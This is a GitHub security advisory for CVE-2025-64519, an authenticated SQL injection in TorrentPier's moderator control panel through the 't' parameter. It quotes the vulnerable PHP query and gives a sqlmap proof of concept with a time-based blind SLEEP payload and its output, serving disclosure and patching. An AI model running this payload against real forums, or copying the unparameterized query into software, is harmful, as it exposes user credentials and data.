# [H] TorrentPier is Vulnerable to Authenticated SQL Injection through Moderator Control Panel's topic_id parameter

## Summary
Severity: High
Advisory: GHSA-4rwr-8c3m-55f6
CVE: CVE-2025-64519
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2025-11-10
Source: https://github.com/advisories/GHSA-4rwr-8c3m-55f6
Type: github-advisory

## Affected
- Packagist: `torrentpier/torrentpier` — affected >=0 <2.8.9

## Details
### Summary
An authenticated SQL injection vulnerability exists in the moderator control panel (`modcp.php`). Users with moderator permissions can exploit this vulnerability by supplying a malicious `topic_id` (`t`) parameter. This allows an authenticated moderator to execute arbitrary SQL queries, leading to the potential disclosure, modification, or deletion of any data in the database.

### Details
The vulnerability is triggered when `modcp.php` processes a request that includes a `topic_id` (`t` parameter). The value of `$topic_id` is taken directly from user input and is not sanitized or parameterized before being concatenated into an SQL query.

This occurs within the initial data retrieval block for a given topic ID.

**Vulnerable Code Block in `modcp.php` (lines 111-122):**
```php
if ($topic_id) {
    $sql = "
		SELECT
			f.forum_id, f.forum_name, f.forum_topics, f.self_moderated,
			t.topic_first_post_id, t.topic_poster
		FROM " . BB_TOPICS . " t, " . BB_FORUMS . " f
		WHERE t.topic_id = $topic_id
			AND f.forum_id = t.forum_id
		LIMIT 1
	";

    if (!$topic_row = DB()->fetch_row($sql)) {
        bb_die($lang['INVALID_TOPIC_ID_DB']);
    }
    // ...
}
```
In the `WHERE t.topic_id = $topic_id` clause, the `$topic_id` variable is directly embedded into the query string. An attacker can inject SQL syntax (e.g., boolean logic, time-based functions) into the `t` parameter to manipulate the query's execution.

### PoC
This is a time-based blind SQL injection vulnerability that requires moderator privileges.

**Prerequisites:**
1.  A running instance of TorrentPier.
2.  An account with moderator permissions.

**Steps to Reproduce:**

1.  Log in as a moderator.
2.  Obtain your full session cookie string from your browser's developer tools.
3.  Use `sqlmap` to automate the exploitation. The tool will test the `t` parameter for vulnerabilities.

**`sqlmap` Command:**
*(Note: Replace `https://localhost` with the target URL and `"your_full_cookie_string"` with the actual cookie data from your browser session, e.g., `"key1=value1; key2=value2"`)*.

```bash
sqlmap -u "https://localhost/modcp.php?mode=lock&t=1" -p t --cookie "your_full_cookie_string" --dbms mysql --technique T --current-db
```

**`sqlmap` Output Confirmation:**
The following output from `sqlmap` confirms successful exploitation:
```
---
Parameter: t (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: mode=lock&t=1 AND (SELECT 9461 FROM (SELECT(SLEEP(5)))KxhM)
---
[INFO] the back-end DBMS is MySQL
[INFO] fetching current database
[INFO] retrieved: torrentpier
current database: 'torrentpier'
```

### Impact
This is an authenticated SQL Injection vulnerability. Although it requires moderator privileges, it is still severe. A malicious or compromised moderator account can leverage this vulnerability to:

*   **Read sensitive data:** Extract any information from the database, including user credentials (password hashes), private messages, email addresses, and other private data.
*   **Modify data:** Alter records in the database, such as elevating their own or other users' privileges to administrator level.
*   **Delete data:** Corrupt or destroy forum data by dropping tables or deleting records.

## References
- https://github.com/torrentpier/torrentpier/security/advisories/GHSA-4rwr-8c3m-55f6
- https://github.com/torrentpier/torrentpier/commit/6a0f6499d89fa5d6e2afa8ee53802a1ad11ece80
- https://github.com/torrentpier/torrentpier
- https://github.com/torrentpier/torrentpier/releases/tag/v2.8.9
